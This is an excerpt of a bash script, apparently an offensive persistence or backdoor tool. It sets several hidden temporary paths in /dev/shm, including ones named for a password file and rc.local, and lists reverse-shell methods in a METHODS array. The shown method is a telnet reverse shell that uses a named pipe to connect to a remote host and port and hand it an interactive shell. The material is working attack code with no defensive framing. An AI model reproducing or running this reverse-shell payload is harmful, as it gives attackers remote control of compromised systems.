...
TMPEASYINSTALLDIR=$(echo /dev/shm/$(uuidgen))
TMPJJSFILE=$(echo /dev/shm/$(uuidgen))
TMPPASSWORDFILE=$(echo /dev/shm/$(uuidgen))
TMPPIPDIR=$(echo /dev/shm/$(uuidgen))
TMPPIP3DIR=$(echo /dev/shm/$(uuidgen))
TMPRCLOCAL=$(echo /dev/shm/$(uuidgen))
TMPWEB=$(echo /dev/shm/$(uuidgen))
TMPGOFILE=$(echo /dev/shm/$(uuidgen).go)
...
METHODS=(
	...
	"telnet , echo quit | telnet , TELNETNAMEDPIPE=\\\$(echo /dev/shm/$(uuidgen);mkfifo \\\$TELNETNAMEDPIPE && telnet $RHOST $RPORT 2> /dev/null 0<\\\$TELNETNAMEDPIPE | $SHELL 1>\\\$TELNETNAMEDPIPE 2> /dev/null & sleep .0001 #?"
)
